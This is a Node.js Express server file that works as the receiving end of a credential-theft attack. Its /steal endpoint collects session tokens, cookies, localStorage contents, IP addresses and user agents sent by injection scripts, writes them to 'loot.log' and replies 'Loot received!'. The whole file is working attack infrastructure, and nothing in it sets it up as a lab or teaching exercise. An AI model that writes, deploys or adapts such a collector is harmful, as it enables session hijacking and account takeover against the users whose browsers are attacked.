// server.js
const express = require('express');
const fs = require('fs');
const https = require('https');
const http = require('http'); // Fallback to HTTP
const path = require('path');
require('dotenv').config();

const app = express();

// Parse JSON bodies
app.use(express.json());

// Also parse URL-encoded bodies (for iframe form submissions)
app.use(express.urlencoded({ extended: true }));

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    
    try {
        fs.appendFileSync(LOG_FILE, line);
    } catch (err) {
        console.error('[LOOT] Error writing to log file:', err);
    }
}

// --- HTTPS Setup with Fallback ---
const certDir = path.join(__dirname, 'certs');
const certFile = path.join(certDir, 'cert.pem');
const keyFile = path.join(certDir, 'key.pem');

let useHttps = false;
let httpsOptions = {};

if (fs.existsSync(certFile) && fs.existsSync(keyFile)) {
    try {
        const certContent = fs.readFileSync(certFile, 'utf8');
        const keyContent = fs.readFileSync(keyFile, 'utf8');
        
        // Check if files actually contain PEM data
        if (certContent.includes('-----BEGIN CERTIFICATE-----') && 
            keyContent.includes('-----BEGIN PRIVATE KEY-----')) {
            httpsOptions = {
                key: keyContent,
                cert: certContent,
            };
            useHttps = true;
        } else {
            console.warn('[LOOT] Cert files exist but are not valid PEM. Falling back to HTTP.');
        }
    } catch (e) {
        console.warn('[LOOT] Error reading certs:', e.message);
    }
} else {
    console.warn('[LOOT] Cert files not found. Falling back to HTTP.');
}

// --- Routes ---
app.post('/steal', (req, res) => {
    let payload = req.body;

    // If the body has a 'data' field (from some injection scripts), parse it
    if (payload.data && typeof payload.data === 'string') {
        try {
            payload = JSON.parse(payload.data);
        } catch (e) {
            console.error('[LOOT] Failed to parse nested JSON');
        }
    }

    const token = payload.token || '';
    const cookie = payload.cookie || '';
    const localStorageData = payload.localStorageData || '';
    const userAgent = payload.userAgent || req.get('User-Agent') || 'Unknown';
    const url = payload.url || req.originalUrl;
    const ip = req.ip || req.connection.remoteAddress;

    // Log securely
    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        localStorageData: localStorageData,
        ip: ip,
        userAgent: userAgent,
        url: url,
        timestamp: new Date().toISOString()
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('[LOOT] Server Error:', err);
    res.status(500).json({ error: 'Internal Server Error' });
});

// Start Server
const PORT = process.env.PORT || 3000;

if (useHttps) {
    const server = https.createServer(httpsOptions, app);
    server.listen(PORT, () => {
        console.log(`HTTPS Server running on port ${PORT}`);
    });
} else {
    const server = http.createServer(app);
    server.listen(PORT, () => {
        console.log(`HTTP Server running on port ${PORT}`);
    });
}

module.exports = app;
